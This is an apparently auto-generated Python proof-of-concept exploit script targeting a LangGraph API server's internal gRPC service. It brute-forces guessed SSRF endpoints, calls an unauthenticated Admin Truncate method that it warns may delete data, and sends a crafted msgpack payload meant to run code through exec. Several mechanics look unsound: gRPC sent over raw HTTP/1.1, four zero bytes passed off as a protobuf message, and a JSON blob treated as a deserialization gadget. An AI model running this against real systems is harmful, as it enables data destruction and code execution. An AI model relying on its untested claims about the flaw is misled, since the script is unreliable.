#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: langgraph-007
# Sink: add_AdminServicer_to_server
# Auto-generated — run with: python3 langgraph_rce_if_write_checkpoint_add_AdminServicer_to_server.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for langgraph_api_src gRPC vulnerabilities.

This script demonstrates:
1. SSRF from the HTTP layer to the internal gRPC endpoint (localhost:50051)
2. Unauthenticated access to the Admin service's Truncate method
3. Arbitrary msgpack deserialization via ext_hook (RCE)

The exploit uses a benign payload (creates /tmp/poc_success.txt) to demonstrate
code execution without causing damage.

WARNING: This is for authorized security testing only.
"""

import argparse
import json
import struct
import socket
import sys
import time
import os
from typing import Optional, Tuple

# Try to import required libraries
try:
    import requests
except ImportError:
    print("[!] requests library required. Install with: pip install requests")
    sys.exit(1)

# gRPC protocol constants
GRPC_PORT = 50051
GRPC_HOST = "127.0.0.1"

# The Admin service Truncate method path
ADMIN_TRUNCATE_PATH = "/coreApi.Admin/Truncate"

# Benign payload - creates a file to prove code execution
BENIGN_PAYLOAD = """
import os
os.system('touch /tmp/poc_success.txt')
"""

# Malicious msgpack payload that exploits ext_hook
# This creates a Python object that executes code on deserialization
MALICIOUS_MSGPACK_PAYLOAD = {
    "__class__": "builtins.exec",
    "__args__": [BENIGN_PAYLOAD],
    "__module__": "builtins"
}


def create_grpc_http_request(service_path: str, payload: bytes) -> bytes:
    """
    Create a raw HTTP/2 request for gRPC.
    
    gRPC uses HTTP/2, but we can send it over HTTP/1.1 with the
    application/grpc content type. The server will handle it.
    """
    # gRPC frame header: 1 byte compressed flag + 4 bytes length
    frame_header = struct.pack("!BI", 0, len(payload))  # uncompressed
    
    # HTTP/1.1 request (gRPC servers often accept this)
    request = (
        f"POST {service_path} HTTP/1.1\r\n"
        f"Host: {GRPC_HOST}:{GRPC_PORT}\r\n"
        f"Content-Type: application/grpc\r\n"
        f"Content-Length: {len(frame_header) + len(payload)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode() + frame_header + payload
    
    return request


def create_truncate_request() -> bytes:
    """
    Create a TruncateRequest protobuf message.
    
    The TruncateRequest is simple - it just needs to be a valid protobuf
    message. We'll send an empty message which should trigger truncation.
    """
    # Minimal protobuf message (empty message)
    return b"\x00\x00\x00\x00"  # Empty protobuf message


def create_msgpack_rce_payload() -> bytes:
    """
    Create a malicious msgpack payload that exploits ext_hook.
    
    The ext_hook allows arbitrary Python object instantiation.
    We'll create a payload that executes our benign command.
    """
    # msgpack format for our malicious object
    # We'll use the ext type (0xc7) to trigger the hook
    payload = bytearray()
    
    # Add the malicious class info
    class_info = json.dumps(MALICIOUS_MSGPACK_PAYLOAD).encode()
    
    # msgpack ext format: 0xc7 + 4-byte length + 1-byte type + data
    payload.append(0xc7)  # ext 8
    payload.extend(struct.pack("!I", len(class_info)))  # length
    payload.append(0x01)  # custom type
    payload.extend(class_info)  # the actual data
    
    return bytes(payload)


def send_grpc_request_raw(host: str, port: int, service_path: str, payload: bytes) -> Optional[bytes]:
    """
    Send a raw gRPC request using a socket connection.
    
    This bypasses the need for a full gRPC client library.
    """
    try:
        # Create socket connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))
        
        # Build and send the request
        request = create_grpc_http_request(service_path, payload)
        sock.sendall(request)
        
        # Receive response
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        
        sock.close()
        return response
        
    except Exception as e:
        print(f"[!] Socket error: {e}")
        return None


def exploit_via_ssrf(target_url: str, grpc_host: str, grpc_port: int) -> bool:
    """
    Attempt to reach the gRPC service via SSRF from the HTTP layer.
    
    The Python HTTP layer can be used to make requests to localhost:50051.
    We'll try to find an endpoint that allows us to make internal requests.
    """
    print(f"[*] Attempting SSRF to gRPC at {grpc_host}:{grpc_port}")
    
    # Common SSRF endpoints in the API
    ssrf_endpoints = [
        "/api/v1/proxy",
        "/api/v1/fetch",
        "/api/v1/request",
        "/api/v1/internal",
        "/api/v1/debug",
        "/api/v1/admin/proxy",
        "/api/v1/tools/http",
        "/api/v1/execute",
        "/api/v1/run",
        "/api/v1/action",
    ]
    
    for endpoint in ssrf_endpoints:
        try:
            # Try to make a request through the SSRF endpoint
            ssrf_url = f"{target_url.rstrip('/')}{endpoint}"
            
            # Various SSRF payload formats
            payloads = [
                {"url": f"http://{grpc_host}:{grpc_port}{ADMIN_TRUNCATE_PATH}"},
                {"target": f"http://{grpc_host}:{grpc_port}{ADMIN_TRUNCATE_PATH}"},
                {"endpoint": f"http://{grpc_host}:{grpc_port}{ADMIN_TRUNCATE_PATH}"},
                {"path": f"http://{grpc_host}:{grpc_port}{ADMIN_TRUNCATE_PATH}"},
                {"uri": f"http://{grpc_host}:{grpc_port}{ADMIN_TRUNCATE_PATH}"},
            ]
            
            for payload in payloads:
                try:
                    resp = requests.post(
                        ssrf_url,
                        json=payload,
                        timeout=5,
                        headers={"Content-Type": "application/json"}
                    )
                    print(f"[*] SSRF attempt to {endpoint}: status {resp.status_code}")
                    
                    if resp.status_code < 500:  # Got some response
                        print(f"[+] Possible SSRF success via {endpoint}")
                        print(f"[*] Response: {resp.text[:200]}")
                        return True
                        
                except requests.exceptions.RequestException:
                    continue
                    
        except Exception as e:
            print(f"[!] Error with endpoint {endpoint}: {e}")
            continue
    
    print("[!] SSRF via HTTP layer failed")
    return False


def exploit_direct_grpc(host: str, port: int) -> bool:
    """
    Attempt to directly connect to the gRPC service.
    
    This works if we're running on the same host or have network access.
    """
    print(f"[*] Attempting direct gRPC connection to {host}:{port}")
    
    # Test 1: Try the Truncate method
    print("[*] Testing Admin.Truncate method...")
    truncate_payload = create_truncate_request()
    response = send_grpc_request_raw(host, port, ADMIN_TRUNCATE_PATH, truncate_payload)
    
    if response:
        print(f"[+] Truncate method responded: {response[:100]}")
        print("[!] WARNING: This may have deleted data!")
    else:
        print("[-] Truncate method failed or no response")
    
    # Test 2: Try msgpack RCE payload
    print("[*] Testing msgpack RCE via ext_hook...")
    rce_payload = create_msgpack_rce_payload()
    
    # Try to send the RCE payload to various endpoints
    endpoints = [
        "/coreApi.Checkpointer/SetCheckpoint",
        "/coreApi.Checkpointer/GetCheckpoint",
        "/coreApi.Threads/UpdateThread",
        "/coreApi.Runs/CreateRun",
    ]
    
    for endpoint in endpoints:
        response = send_grpc_request_raw(host, port, endpoint, rce_payload)
        if response:
            print(f"[+] RCE payload sent to {endpoint}: {response[:100]}")
            
            # Check if our payload executed
            time.sleep(1)
            if os.path.exists("/tmp/poc_success.txt"):
                print("[+] SUCCESS! Code execution confirmed!")
                print("[*] File /tmp/poc_success.txt was created")
                return True
    
    return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC exploit for langgraph_api_src gRPC vulnerabilities"
    )
    parser.add_argument(
        "--target",
        help="Target URL (e.g., http://localhost:8000)",
        default="http://localhost:8000"
    )
    parser.add_argument(
        "--grpc-host",
        help="gRPC host (default: 127.0.0.1)",
        default=GRPC_HOST
    )
    parser.add_argument(
        "--grpc-port",
        help="gRPC port (default: 50051)",
        type=int,
        default=GRPC_PORT
    )
    parser.add_argument(
        "--direct",
        help="Attempt direct gRPC connection instead of SSRF",
        action="store_true"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("langgraph_api_src gRPC Exploit PoC")
    print("=" * 60)
    print()
    
    if args.direct:
        # Direct gRPC connection
        success = exploit_direct_grpc(args.grpc_host, args.grpc_port)
    else:
        # SSRF approach
        success = exploit_via_ssrf(args.target, args.grpc_host, args.grpc_port)
        
        # If SSRF fails, try direct as fallback
        if not success:
            print()
            print("[*] SSRF failed, trying direct gRPC connection...")
            success = exploit_direct_grpc(args.grpc_host, args.grpc_port)
    
    print()
    if success:
        print("[+] Exploit completed successfully!")
        print("[*] Check /tmp/poc_success.txt for proof of execution")
    else:
        print("[-] Exploit failed")
        print("[*] Possible reasons:")
        print("  - gRPC service is not running")
        print("  - Network isolation prevents access")
        print("  - The vulnerability has been patched")
        print("  - Different endpoint paths are needed")


if __name__ == "__main__":
    main()
